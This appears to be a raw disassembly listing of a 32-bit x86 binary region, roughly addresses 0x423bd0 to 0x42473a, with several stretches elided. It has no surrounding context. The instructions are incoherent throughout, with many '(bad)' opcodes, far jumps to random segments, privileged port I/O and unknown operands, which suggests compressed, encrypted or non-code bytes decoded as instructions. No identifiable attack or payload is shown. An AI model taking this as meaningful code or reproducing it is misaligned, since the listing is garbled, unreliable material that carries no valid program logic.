  423bd0:	bound  ebp,QWORD PTR [esp+ecx*8+0x3c]
  423bd4:	shr    cl,1
  423bd6:	cmp    BYTE PTR [eiz*2-0x11302ca],bh
  423bdd:	mov    al,0xa4
  423bdf:	test   BYTE PTR [edi+ecx*4],0x33
  423be3:	dec    edi
  423be4:	cli    
  423be5:	xchg   esi,eax
  423be6:	and    dl,BYTE PTR [edi]
  423be8:	fcomp  DWORD PTR [ecx-0xc264443]
  423bee:	sbb    BYTE PTR [esi+0x4f],ch
  423bf1:	pop    ebp
  423bf2:	stc    
  423bf3:	cmp    DWORD PTR [edx+eiz*8],ecx
  423bf6:	xchg   edi,eax
  423bf7:	int    0xae
  423bf9:	lahf   
  423bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bfb:	pop    es
  423bfc:	std    
  423bfd:	push   ds
  423bfe:	lock adc ch,BYTE PTR [ecx+0x4]
  423c02:	sbb    bh,bh
  423c04:	and    eax,0x42b30ef8
  423c09:	and    al,0xcb
  423c0b:	aad    0x56
  423c0d:	sbb    al,0xb6
  423c0f:	inc    edx
  423c10:	jmp    0x32c7:0xe176
  423c16:	pop    esi
  423c17:	aad    0x1a
  423c19:	mov    bh,0xa5
  423c1b:	or     eax,0xbded1534
  423c20:	push   esi
  423c21:	mov    cl,0xe
  423c23:	cmp    dl,ch
  423c25:	stc    
  423c26:	or     ah,ch
  423c28:	push   esi
  423c29:	cmp    eax,0xd232fde6
  423c2e:	fsub   QWORD PTR es:[edi]
  423c31:	daa    
  423c32:	pop    es
  423c33:	sub    eax,0x9523ecbe
  423c38:	fidivr DWORD PTR [edx]
  423c3a:	leave  
  423c3b:	or     ecx,ebp
  423c3d:	push   0x4e5b4f
	...
  423cb2:	add    BYTE PTR [eax],al
  423cb4:	mov    edi,0x626d60bd
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0x134b,0x22
  423cc3:	add    dh,BYTE PTR [edi-0xafffe83]
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    ah,bl
  423ccd:	mov    al,ds:0x44256f98
  423cd2:	stos   DWORD PTR es:[edi],eax
  423cd3:	ror    ebp,1
  423cd5:	fidivr WORD PTR [ebx]
  423cd7:	xchg   ebp,eax
  423cd8:	adc    al,0x87
  423cda:	mov    WORD PTR [eax+0x24],?
  423cdd:	fs add al,0x97
  423ce0:	leave  
  423ce1:	cmp    DWORD PTR [edi-0x36],0x904d058f
  423ce8:	jp     0x423d1c
  423cea:	cli    
  423ceb:	sbb    al,0xd9
  423ced:	lahf   
  423cee:	test   eax,0x896c13b4
  423cf3:	fs sbb ah,0x7
  423cf7:	inc    edi
  423cf8:	sbb    eax,0x19ae51f4
  423cfd:	stos   BYTE PTR es:[edi],al
  423cfe:	pusha  
  423cff:	inc    ebx
  423d00:	xor    BYTE PTR [edx+0x4feaaae3],dl
  423d06:	add    al,0x7
  423d08:	or     BYTE PTR [ecx],al
  423d0a:	mov    WORD PTR [ebx-0x489e4344],es
  423d10:	clc    
  423d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d12:	dec    ebx
  423d13:	adc    ah,BYTE PTR [eax-0x9478995]
  423d19:	fnsave [edx-0x19]
  423d1c:	mov    eax,ds:0x5081e08f
  423d21:	adc    ch,al
  423d23:	loop   0x423d97
  423d25:	ror    ch,0x75
  423d28:	lock xchg ebx,eax
  423d2a:	xor    ebx,DWORD PTR [ebx]
  423d2c:	inc    ecx
  423d2d:	sub    eax,0xca090240
  423d32:	sub    BYTE PTR [ecx-0x46],ah
  423d35:	or     DWORD PTR [esi+0x35],ebp
  423d38:	fist   DWORD PTR [edi]
  423d3a:	enter  0x2b8e,0x79
  423d3e:	ret    0x9a48
  423d41:	lds    esp,FWORD PTR [esi-0x59]
  423d44:	mov    DWORD PTR [eax-0x78],edi
  423d47:	dec    ecx
  423d48:	or     eax,DWORD PTR [ebx-0x4eb13f28]
  423d4e:	inc    ebp
  423d4f:	inc    ebp
  423d50:	mov    ecx,0x179ebb25
  423d55:	or     eax,0x2027a989
  423d5a:	cdq    
  423d5b:	aaa    
  423d5c:	popf   
  423d5d:	test   DWORD PTR [esi+0x302e0f99],0x799f45fb
  423d67:	pop    ds
  423d68:	cmp    eax,0x7a82303a
  423d6d:	add    bh,cl
  423d6f:	adc    al,0x4
  423d71:	into   
  423d72:	dec    eax
  423d73:	pushf  
  423d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d75:	fldenv [edi+0x7f]
  423d78:	seto   bh
  423d7b:	jno    0x423df4
  423d7d:	adc    cl,BYTE PTR [ecx-0x3e91245]
  423d83:	or     ch,BYTE PTR [esi]
  423d85:	or     esi,0xffffff90
  423d88:	stos   BYTE PTR es:[edi],al
  423d89:	test   eax,edi
  423d8b:	or     al,0x7e
  423d8d:	add    DWORD PTR [edi-0x1b623fe3],esp
  423d93:	sub    al,0x18
  423d95:	mov    dh,0x56
  423d97:	adc    edx,DWORD PTR [ecx]
  423d99:	scas   al,BYTE PTR es:[edi]
  423d9a:	aaa    
  423d9b:	pop    edx
  423d9c:	(bad)  
  423d9d:	out    dx,eax
  423d9e:	xor    al,0xd0
  423da0:	mov    edx,esp
  423da2:	pop    edx
  423da3:	(bad)  
  423da4:	outs   dx,BYTE PTR ds:[esi]
  423da5:	fidivr WORD PTR [eax+0x37]
  423da8:	inc    edi
  423da9:	mov    eax,0xea1febeb
  423dae:	inc    edx
  423daf:	stos   DWORD PTR es:[edi],eax
  423db0:	xor    eax,0xb3165465
  423db5:	out    0xdb,eax
  423db7:	or     bl,BYTE PTR [edx-0x261644ca]
  423dbd:	sub    dh,BYTE PTR [ebx]
  423dbf:	xor    ch,dh
	...
  423e31:	add    BYTE PTR [eax],al
  423e33:	add    BYTE PTR [ebx-0x21e677ab],al
  423e39:	fst    QWORD PTR [ebx+0x6b48c6df]
  423e3f:	out    dx,eax
  423e40:	pushf  
  423e41:	and    eax,0x7eacb74c
  423e46:	add    DWORD PTR [eax],eax
  423e48:	cmc    
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    BYTE PTR [edx],dh
  423e4d:	dec    ecx
  423e4e:	out    0x5f,eax
  423e50:	mov    eax,0x7aec7c57
  423e55:	ds mov ch,0xd1
  423e58:	mov    ebx,0x2b25248f
  423e5d:	cmp    ebp,DWORD PTR [esi+0x6c]
  423e60:	gs dec ebp
  423e62:	cs inc esi
  423e64:	xor    cl,BYTE PTR fs:[ebx+0x16ee334b]
  423e6b:	mov    esp,0xcbbcd2cf
  423e70:	cld    
  423e71:	cmp    dl,BYTE PTR [ebx]
  423e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e74:	call   0x6f942390
  423e79:	lock aad 0x7a
  423e7c:	loopne 0x423e42
  423e7e:	inc    esp
  423e7f:	loop   0x423e53
  423e81:	push   cs
  423e82:	or     BYTE PTR ds:0x8df04c73,ch
  423e88:	rcr    ebx,0x3e
  423e8b:	mov    WORD PTR [edx],gs
  423e8d:	adc    eax,0x11d22dfc
  423e92:	adc    DWORD PTR [eax],ebx
  423e94:	pop    ebx
  423e95:	into   
  423e96:	add    dl,BYTE PTR cs:[ecx-0x15895a0b]
  423e9d:	into   
  423e9e:	retf   
  423e9f:	push   edi
  423ea0:	jno    0x423e9b
  423ea2:	test   eax,0x83129549
  423ea7:	div    DWORD PTR [esi]
  423ea9:	inc    eax
  423eaa:	fs xor al,0xbb
  423ead:	out    0xe1,eax
  423eaf:	test   al,0xec
  423eb1:	mov    ebp,0xc59db657
  423eb6:	xchg   ebp,eax
  423eb7:	mov    BYTE PTR [edx+edx*2-0x35],bl
  423ebb:	mov    esp,0x2f352e9c
  423ec0:	pop    edi
  423ec1:	jno    0x423ed4
  423ec3:	pop    esp
  423ec4:	cmp    al,0x20
  423ec6:	mov    bh,0x6f
  423ec8:	push   cs
  423ec9:	inc    edx
  423eca:	jae    0x423eea
  423ecc:	xor    DWORD PTR [eax+0x53],0x2704b0b5
  423ed3:	mov    ds,WORD PTR [ebx-0x5b]
  423ed6:	or     DWORD PTR [edi],0x6d6e85ca
  423edc:	outs   dx,BYTE PTR ds:[esi]
  423edd:	into   
  423ede:	shl    DWORD PTR [edi+0x2b],1
  423ee1:	xlat   BYTE PTR ds:[ebx]
  423ee2:	mov    bh,0xaf
  423ee4:	retf   0x6c1
  423ee7:	mov    esi,0xf3812abc
  423eec:	sbb    BYTE PTR [ebx+ebp*1+0x326978cb],ah
  423ef3:	mov    DWORD PTR ds:0xd1605573,ecx
  423ef9:	sub    DWORD PTR [eax],esi
  423efb:	inc    ebx
  423efc:	mov    edi,0x2e8a4cab
  423f01:	jmp    0x9347a9e7
  423f06:	jle    0x423f30
  423f08:	stos   BYTE PTR es:[edi],al
  423f09:	and    al,0xff
  423f0b:	mov    cl,0x4f
  423f0d:	fsub   DWORD PTR [ecx+eiz*2-0x2ce1211a]
  423f14:	out    0x2e,al
  423f16:	stos   DWORD PTR es:[edi],eax
  423f17:	xor    DWORD PTR [ecx-0x5dc28966],edx
  423f1d:	xor    BYTE PTR ds:0x94346fc1,0xae
  423f24:	popf   
  423f25:	xor    BYTE PTR [eax+0x2d],dh
  423f28:	add    DWORD PTR [ecx-0x6ef95e88],edx
  423f2e:	sahf   
  423f2f:	outs   dx,DWORD PTR ds:[esi]
  423f30:	test   BYTE PTR [edx+0x5dbd38af],bl
  423f36:	push   0x7aa0b8c5
  423f3b:	loopne 0x423ec7
  423f3d:	cmp    ebx,DWORD PTR ds:0x569c
	...
  423fb3:	add    BYTE PTR [esi-0x1c],al
  423fb6:	bound  ecx,QWORD PTR [eax-0x1111711e]
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx+0x4a],dh
  423fc1:	stc    
  423fc2:	mov    WORD PTR [ecx+eiz*4],gs
  423fc5:	jg     0x423fc8
  423fc7:	add    ch,dh
  423fc9:	add    BYTE PTR [eax],al
  423fcb:	add    dh,dl
  423fcd:	mov    ah,0xa1
  423fcf:	cld    
  423fd0:	mov    ds:0x69a4e543,al
  423fd5:	scas   al,BYTE PTR es:[edi]
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	lock stc 
  423fd9:	js     0x424020
  423fdb:	sbb    ebp,esp
  423fdd:	xor    al,0x28
  423fdf:	jge    0x423ff6
  423fe1:	jmp    0x8413:0xccea1921
  423fe8:	and    BYTE PTR [edx-0x332753e6],cl
  423fee:	xchg   ecx,eax
  423fef:	test   BYTE PTR [eax+0x62c871d8],0x1c
  423ff6:	loop   0x424013
  423ff8:	int    0x75
  423ffa:	push   ebp
  423ffb:	retf   0xc6c7
  423ffe:	ds adc al,0xf0
  424001:	repnz aam 0xbb
  424004:	aam    0x71
  424006:	sbb    DWORD PTR [edi-0x75],esp
  424009:	out    dx,al
  42400a:	in     al,0x52
  42400c:	and    esi,DWORD PTR [edx]
  42400e:	xlat   BYTE PTR ds:[ebx]
  42400f:	je     0x423ff7
  424011:	pop    ebx
  424012:	jae    0x423fef
  424014:	into   
  424015:	imul   esp,DWORD PTR [ecx],0xffffffbf
  424018:	jnp    0x423ff3
  42401a:	je     0x423f9d
  42401c:	dec    eax
  42401d:	pusha  
  42401e:	inc    ebx
  42401f:	pop    ds
  424020:	es xchg ebx,eax
  424022:	nop
  424023:	or     DWORD PTR [ebx+0x23],0xf4da2f07
  42402a:	mov    ebp,0x1a031744
  42402f:	scas   al,BYTE PTR es:[edi]
  424030:	ss xchg esp,eax
  424032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424033:	mov    esi,DWORD PTR [esi+0x3b]
  424036:	cmp    al,0xde
  424038:	mov    DWORD PTR [ecx-0x2a],eax
  42403b:	pushf  
  42403c:	and    DWORD PTR [esi-0x62],esp
  42403f:	aam    0xe7
  424041:	xchg   ebx,eax
  424042:	out    dx,al
  424043:	cmp    esi,esi
  424045:	outs   dx,BYTE PTR ds:[esi]
  424046:	les    ebx,FWORD PTR [bx-0x2639]
  42404b:	fdivr  QWORD PTR [esi+0x52]
  42404e:	and    eax,0x96c2fae9
  424053:	hlt    
  424054:	retf   
  424055:	test   BYTE PTR [eax],bl
  424057:	test   eax,0xd65d3f5f
  42405c:	xchg   edx,eax
  42405d:	inc    eax
  42405e:	popf   
  42405f:	jb     0x424007
  424061:	lock fcom QWORD PTR [ebx-0x153f9a33]
  424068:	test   esi,esi
  42406a:	and    BYTE PTR [edi-0x4b1d8650],bl
  424070:	sar    BYTE PTR ds:0xa08ba2be,0x53
  424077:	shl    BYTE PTR [edi+ebx*4+0x65caff0b],0xc9
  42407f:	jecxz  0x4240ab
  424081:	fwait
  424082:	sub    BYTE PTR [ecx-0x549f8c81],ch
  424088:	imul   eax,DWORD PTR [edx+0x70],0xffffffae
  42408c:	test   eax,0x5cced188
  424091:	mov    esp,0xc4995bbb
  424096:	push   ebp
  424097:	mov    bp,0x29db
  42409b:	dec    edi
  42409c:	das    
  42409d:	lahf   
  42409e:	cli    
  42409f:	nop
  4240a0:	fwait
  4240a1:	mov    bh,0x49
  4240a3:	sahf   
  4240a4:	cmp    ebp,ebx
  4240a6:	(bad)  
  4240a7:	clc    
  4240a8:	mov    BYTE PTR [eax-0x1aa0e4fc],dh
  4240ae:	pop    edx
  4240af:	stos   BYTE PTR es:[edi],al
  4240b0:	imul   esi,ebx,0xffffff83
  4240b3:	or     al,0xf2
  4240b5:	(bad)  
  4240b6:	hlt    
  4240b7:	sbb    DWORD PTR [edi-0x3fb63b44],ebx
  4240bd:	clc    
  4240be:	imul   edi,DWORD PTR [edx+0x13],0x0
	...
  424134:	jns    0x424127
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax-0x32028496]
  424142:	in     al,0x1d
  424144:	xchg   esi,eax
  424145:	add    BYTE PTR [ecx],0x0
  424148:	cmc    
  424149:	add    BYTE PTR [eax],al
  42414b:	add    BYTE PTR [edx+0x61cbfe37],ah
  424151:	loopne 0x42410c
  424153:	push   es
  424154:	jno    0x424194
  424156:	imul   ecx,DWORD PTR [edx],0x18d1147c
  42415c:	mov    eax,ds:0xfb4336d
  424161:	jmp    0x424161
  424163:	mov    ds:0x3ab65e22,eax
  424168:	popa   
  424169:	nop
  42416a:	inc    edi
  42416b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42416c:	aaa    
  42416d:	cld    
  42416e:	fdivr  QWORD PTR [ebp-0x11]
  424171:	add    DWORD PTR [edx],0xffffffaf
  424174:	adc    eax,0x867a0da5
  424179:	pop    edx
  42417a:	imul   BYTE PTR [edi+0x31]
  42417d:	add    ecx,edx
  42417f:	adc    BYTE PTR [ebx-0x34],cl
  424182:	mov    ebx,0x84ed54df
  424187:	push   ebx
  424188:	mov    dh,0x63
  42418a:	jb     0x4241ba
  42418c:	sub    al,0x3f
  42418e:	int    0x14
  424190:	test   DWORD PTR [ebx+eiz*8],ebx
  424193:	sbb    cl,BYTE PTR ds:0x55c6e56
  424199:	sbb    ch,bh
  42419b:	adc    eax,0x8b21af76
  4241a0:	pop    es
  4241a1:	xor    eax,0xc662c6dd
  4241a6:	xlat   BYTE PTR ds:[ebx]
  4241a7:	add    BYTE PTR [ebp+ebx*8+0x40],bl
  4241ab:	jmp    FWORD PTR [ecx]
  4241ad:	fimul  WORD PTR [eax]
  4241af:	popf   
  4241b0:	jecxz  0x424230
  4241b2:	ins    BYTE PTR es:[edi],dx
  4241b3:	mov    ds:0xbfa1a247,al
  4241b8:	pop    ds
  4241b9:	cmp    al,BYTE PTR [ecx-0x4a3688c]
  4241bf:	or     DWORD PTR ds:0xf1d33b23,eax
  4241c5:	shl    DWORD PTR [edx],1
  4241c7:	sub    al,0x63
  4241c9:	push   es
  4241ca:	sbb    BYTE PTR [edi-0x6b01362a],al
  4241d0:	cmp    al,0xed
  4241d2:	pop    es
  4241d3:	adc    DWORD PTR [ebx+0x4c2b3fd7],esp
  4241d9:	test   BYTE PTR [ebp-0x46],al
  4241dc:	cmc    
  4241dd:	jb     0x4241ba
  4241df:	xor    ebp,esi
  4241e1:	cmp    dh,BYTE PTR ds:0xbc30c384
  4241e7:	repz mov WORD PTR [ebx+0x18340e9e],ds
  4241ee:	fld    QWORD PTR [edx+0x19]
  4241f1:	into   
  4241f2:	lods   al,BYTE PTR ds:[esi]
  4241f3:	xor    bh,BYTE PTR [ecx+edi*1+0x11b3a35e]
  4241fa:	xchg   esi,eax
  4241fb:	repz lahf 
  4241fd:	add    BYTE PTR [ecx],0xfa
  424200:	scas   eax,DWORD PTR es:[edi]
  424201:	mov    BYTE PTR [edi-0xa],dh
  424204:	push   esp
  424205:	cwde   
  424206:	ja     0x424253
  424208:	ficom  WORD PTR [ebp-0x42]
  42420b:	and    edi,ecx
  42420d:	in     al,0x68
  42420f:	ret    0x14b7
  424212:	sub    DWORD PTR [edx-0x65dff956],0x53
  424219:	test   BYTE PTR [edi],dh
  42421b:	xlat   BYTE PTR ds:[ebx]
  42421c:	xchg   ebp,eax
  42421d:	cs add al,0xef
  424220:	mov    dl,0xad
  424222:	popf   
  424223:	add    eax,DWORD PTR [ebx+0x23]
  424226:	stos   DWORD PTR es:[edi],eax
  424227:	push   edx
  424228:	lock retf 0xf40c
  42422c:	pop    ecx
  42422d:	mov    ah,0x68
  42422f:	sub    BYTE PTR [ebx+ecx*1],dl
  424232:	mov    al,bh
  424234:	adc    eax,0x21e598a0
  424239:	loope  0x4241f9
  42423b:	mov    eax,ds:0x5444b4a3
  424240:	inc    ebx
	...
  4242b1:	add    BYTE PTR [eax],al
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x7aaaa4bf,eax
  4242c2:	xchg   edx,eax
  4242c3:	int3   
  4242c4:	mov    eax,DWORD PTR [ecx+0xf50001]
  4242ca:	add    BYTE PTR [eax],al
  4242cc:	cli    
  4242cd:	jecxz  0x42427d
  4242cf:	aad    0xbc
  4242d1:	add    BYTE PTR [eax+esi*4-0x73],cl
  4242d5:	jmp    0xdda6ecd7
  4242da:	pop    edi
  4242db:	scas   al,BYTE PTR es:[edi]
  4242dc:	lods   eax,DWORD PTR ds:[esi]
  4242dd:	les    edx,FWORD PTR [edx-0x1e]
  4242e0:	pop    ds
  4242e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242e2:	lock adc ecx,DWORD PTR [edx-0x72]
  4242e6:	sbb    eax,0x76b92bc5
  4242eb:	jns    0x4242a1
  4242ed:	dec    ecx
  4242ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242ef:	dec    edx
  4242f0:	mov    ds:0x97da1561,al
  4242f5:	ror    DWORD PTR [eax+0x56e8de4d],0xd3
  4242fc:	mov    eax,0x66dd467
  424301:	inc    edi
  424302:	xor    eax,0x4cbb5d28
  424307:	push   esp
  424308:	fdivrp st(1),st
  42430a:	test   BYTE PTR [edi+0x701889cf],bl
  424310:	jg     0x4242e1
  424312:	jne    0x42430d
  424314:	out    dx,al
  424315:	push   edx
  424316:	xchg   DWORD PTR [esi],esi
  424318:	ja     0x4242dc
  42431a:	sub    DWORD PTR [eax+0x48fb68c5],ebp
  424320:	mov    al,ds:0xac61aee2
  424325:	jb     0x424332
  424327:	xor    DWORD PTR [esi+eax*4-0x3d],0x394e2066
  42432f:	inc    esp
  424330:	adc    ecx,ecx
  424332:	dec    ebp
  424333:	enter  0x15e2,0x75
  424337:	pop    ds
  424338:	xchg   edi,eax
  424339:	add    bh,BYTE PTR [eax]
  42433b:	das    
  42433c:	add    bh,BYTE PTR [ebp-0x72]
  42433f:	fist   WORD PTR [esi+0x16]
  424342:	lods   eax,DWORD PTR ds:[esi]
  424343:	cmp    DWORD PTR [ecx+0x6f9550d8],0x68
  42434a:	pop    esp
  42434b:	sbb    al,0x8f
  42434d:	outs   dx,BYTE PTR ds:[esi]
  42434e:	icebp  
  42434f:	pop    ebp
  424350:	jns    0x4243d0
  424352:	or     eax,0xdf9b6170
  424357:	gs in  al,dx
  424359:	xor    DWORD PTR [edx+0x50],ebp
  42435c:	sahf   
  42435d:	fmul   st(5),st
  42435f:	adc    ebx,DWORD PTR [esi+0x168a1965]
  424365:	xchg   esp,eax
  424366:	shl    ebp,cl
  424368:	mov    cl,0x81
  42436a:	adc    BYTE PTR [edi+0x3],ah
  42436d:	popf   
  42436e:	call   0xdef9:0xecb919b
  424375:	cmp    BYTE PTR [ebx+esi*4-0x5d4b184f],0x4b
  42437d:	stc    
  42437e:	iret   
  42437f:	outs   dx,BYTE PTR ds:[esi]
  424380:	mov    ds:0xddea88bb,al
  424385:	loope  0x42431b
  424387:	shl    BYTE PTR [edi],0x94
  42438a:	mul    DWORD PTR [esi]
  42438c:	push   ds
  42438d:	mov    esp,0x5e269fa5
  424392:	mov    ebp,0xb7259136
  424397:	loop   0x424390
  424399:	aas    
  42439a:	call   0x2e7c:0x8071ee0c
  4243a1:	dec    ecx
  4243a2:	cli    
  4243a3:	sar    BYTE PTR [esp+eax*1],0xfd
  4243a7:	mov    cs,WORD PTR [eax-0x7427af0d]
  4243ad:	jb     0x4243cc
  4243af:	sub    cl,BYTE PTR ds:0xe572
  4243b4:	xchg   ecx,ebp
  4243b6:	les    esp,FWORD PTR [edi+0x48a17e8f]
  4243bc:	push   ss
  4243bd:	cdq    
  4243be:	xchg   ecx,eax
  4243bf:	sub    DWORD PTR [ecx+0x0],0x0
	...
  424431:	add    BYTE PTR [eax],al
  424433:	add    al,al
  424435:	mov    al,0x45
  424437:	outs   dx,DWORD PTR ds:[esi]
  424438:	jne    0x424439
  42443a:	jmp    0xabd2:0x8abb70bf
  424441:	out    dx,al
  424442:	scas   eax,DWORD PTR es:[edi]
  424443:	rol    BYTE PTR [eax-0xafffe7e],cl
  424449:	add    BYTE PTR [eax],al
  42444b:	add    ah,ch
  42444d:	dec    esp
  42444e:	mov    eax,ds:0xa1ab81a8
  424453:	retf   0xbdac
  424456:	sub    bl,al
  424458:	push   edx
  424459:	lods   eax,DWORD PTR ds:[esi]
  42445a:	mov    edx,edx
  42445c:	daa    
  42445d:	shl    DWORD PTR [edi+eax*4-0x1981e6a0],0x7b
  424465:	cmp    edx,DWORD PTR [eax+ebp*2-0x42]
  424469:	fwait
  42446a:	inc    ebx
  42446b:	mov    BYTE PTR ds:0xc0ad6b63,dh
  424471:	hlt    
  424472:	sub    eax,0x524a3cbc
  424477:	lock out dx,al
  424479:	push   es
  42447a:	inc    DWORD PTR [ebp+0x27]
  42447d:	gs aas 
  42447f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424480:	lods   eax,DWORD PTR ds:[esi]
  424481:	push   ecx
  424482:	xor    BYTE PTR [ecx-0x1c],al
  424485:	push   ecx
  424486:	je     0x4244b6
  424488:	xor    BYTE PTR [edi-0x4eef0b8d],al
  42448e:	in     al,dx
  42448f:	ret    
  424490:	cmp    ch,cl
  424492:	addr16 jmp 0x95fd:0x3e35a161
  42449a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42449b:	pop    es
  42449c:	ja     0x424461
  42449e:	retf   0x4643
  4244a1:	ret    0x845
  4244a4:	popf   
  4244a5:	mov    edx,0xae0ea22
  4244aa:	fcomp  st(1)
  4244ac:	(bad)  [esi-0x31]
  4244af:	and    eax,0x6a56d8f5
  4244b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244b5:	inc    esi
  4244b6:	push   edi
  4244b7:	push   0x16
  4244b9:	adc    al,0x32
  4244bb:	push   es
  4244bc:	sub    dl,dl
  4244be:	or     BYTE PTR [ecx],0xdb
  4244c1:	xchg   edx,eax
  4244c2:	jne    0x42451c
  4244c4:	jb     0x4244f8
  4244c6:	or     al,0x38
  4244c8:	mov    ?,WORD PTR [ecx]
  4244ca:	mov    ebp,0x8b0a8a7e
  4244cf:	push   ebx
  4244d0:	push   esp
  4244d1:	xor    edx,DWORD PTR [ebp-0x42045023]
  4244d7:	add    BYTE PTR [edx+0x1d],al
  4244da:	lea    ebx,[ebp+0x302ab9b5]
  4244e0:	shl    BYTE PTR [eax+0x4d],1
  4244e3:	into   
  4244e4:	mov    ebp,DWORD PTR [edi-0x48]
  4244e7:	mov    dl,0xff
  4244e9:	push   ds
  4244ea:	clc    
  4244eb:	mov    dl,0x9c
  4244ed:	aaa    
  4244ee:	pop    ecx
  4244ef:	xor    edi,DWORD PTR [edi+0xf20ef36]
  4244f5:	fdiv   DWORD PTR [edx-0x8d31a8c]
  4244fb:	xchg   ecx,eax
  4244fc:	mov    eax,0xa9ff4a5b
  424501:	xchg   edi,eax
  424502:	stc    
  424503:	fs (bad) 
  424505:	dec    DWORD PTR [ebx+0x424887ed]
  42450b:	leave  
  42450c:	sub    DWORD PTR [esi+0x26],eax
  42450f:	ret    0xc825
  424512:	xchg   edi,eax
  424513:	inc    edx
  424514:	sbb    al,0x3a
  424516:	jae    0x424515
  424518:	nop
  424519:	push   es
  42451a:	arpl   WORD PTR [edx+0x5],si
  42451d:	out    0x26,eax
  42451f:	xchg   edx,eax
  424520:	loop   0x424547
  424522:	sti    
  424523:	mov    esi,eax
  424525:	retf   0x7b3d
  424528:	adc    eax,0xc17a851
  42452d:	or     ch,BYTE PTR [ecx+0x72]
  424530:	mov    bl,0xee
  424532:	inc    esp
  424533:	mov    ah,0x27
  424535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424536:	or     DWORD PTR [esp+eax*2-0x4a],0x9d91156d
  42453e:	retf   
  42453f:	prefetchnta BYTE PTR [eax]
	...
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	or     BYTE PTR [edi-0x8808b84],0x88
  4245bb:	(bad)  
  4245bc:	jle    0x424610
  4245be:	ins    BYTE PTR es:[edi],dx
  4245bf:	xor    ebx,ebp
  4245c1:	mov    ds:0x8375a653,eax
  4245c6:	add    DWORD PTR [eax],eax
  4245c8:	cmc    
  4245c9:	add    BYTE PTR [eax],al
  4245cb:	add    BYTE PTR [eiz*2-0xa418230],dh
  4245d2:	dec    ebp
  4245d3:	xor    al,0x12
  4245d5:	scas   al,BYTE PTR es:[edi]
  4245d6:	dec    eax
  4245d7:	pushf  
  4245d8:	leave  
  4245d9:	outs   dx,BYTE PTR ds:[esi]
  4245da:	xchg   esp,eax
  4245db:	das    
  4245dc:	iret   
  4245dd:	stc    
  4245de:	pop    ecx
  4245df:	pop    ecx
  4245e0:	mov    dl,0xd7
  4245e2:	gs inc esp
  4245e4:	jg     0x42456a
  4245e6:	jnp    0x424633
  4245e8:	mov    dl,0x6
  4245ea:	fdiv   DWORD PTR [ecx-0x30]
  4245ed:	push   esp
  4245ee:	stc    
  4245ef:	inc    eax
  4245f0:	jno    0x4245d1
  4245f2:	xchg   ebp,eax
  4245f3:	adc    ah,BYTE PTR [edx-0x39763674]
  4245f9:	std    
  4245fa:	pop    eax
  4245fb:	stos   BYTE PTR es:[edi],al
  4245fc:	and    cl,0x8e
  4245ff:	jmp    0xdf2e:0xc294a49b
  424606:	jne    0x424616
  424608:	mov    edx,0xf7b5477e
  42460d:	fs loopne 0x424639
  424610:	cld    
  424611:	jns    0x4245ca
  424613:	sub    ebx,DWORD PTR [esi+edx*4-0x61b2d025]
  42461a:	mov    ds:0xb53cca8f,eax
  42461f:	jbe    0x4245cc
  424621:	sub    eax,0x1c4ea3d3
  424626:	sbb    cl,BYTE PTR [eax-0x5972edd1]
  42462c:	icebp  
  42462d:	mov    cl,0x66
  42462f:	fdivp  st(1),st
  424631:	push   edi
  424632:	inc    esp
  424633:	mov    bl,0x67
  424635:	jbe    0x4245fb
  424637:	shl    DWORD PTR [edi],cl
  424639:	call   0xe32518a8
  42463e:	push   0xffffffc8
  424640:	pop    ecx
  424641:	inc    edx
  424642:	jecxz  0x42460e
  424644:	inc    esi
  424645:	fnstsw WORD PTR [eax+eax*8-0x1abf0c47]
  42464c:	jg     0x424678
  42464e:	iret   
  42464f:	(bad)  
  424650:	in     eax,dx
  424651:	arpl   WORD PTR [edx+0x61ee620a],bx
  424657:	inc    edi
  424658:	ret    0xfb8
  42465b:	test   BYTE PTR [edi-0x1f36c4ab],dh
  424661:	jmp    0xda37115f
  424666:	xor    esi,DWORD PTR [edi-0x71]
  424669:	aad    0xfc
  42466b:	mov    al,0xef
  42466d:	mov    ch,0x81
  42466f:	test   al,0xa
  424671:	and    al,0xce
  424673:	adc    eax,0xc5930ce7
  424678:	mov    ecx,0x395cabe6
  42467d:	jmp    0xe9ffb9eb
  424682:	stc    
  424683:	pop    ds
  424684:	or     BYTE PTR [edi-0x2ab994e0],bh
  42468a:	jp     0x424704
  42468c:	cmp    eax,0x3a1e2292
  424691:	pop    ds
  424692:	xor    eax,DWORD PTR [esp+ebx*4-0x1f]
  424696:	or     esp,DWORD PTR [edi-0x1858255]
  42469c:	mov    DWORD PTR [eax+0x73],eax
  42469f:	dec    edx
  4246a0:	iret   
  4246a1:	mov    dh,0x80
  4246a3:	and    ah,BYTE PTR [ecx]
  4246a5:	stos   BYTE PTR es:[edi],al
  4246a6:	cs retf 
  4246a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246a9:	xchg   DWORD PTR [ecx+0x5d],esi
  4246ac:	ret    0xa446
  4246af:	jbe    0x4246ee
  4246b1:	mov    esp,0x441bf5b1
  4246b6:	push   ebx
  4246b7:	dec    ecx
  4246b8:	loop   0x424664
  4246ba:	xchg   DWORD PTR [eax+edi*8+0x54d543e8],edx
	...
  424731:	add    BYTE PTR [eax],al
  424733:	add    BYTE PTR [ebx+eiz*1],dh
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
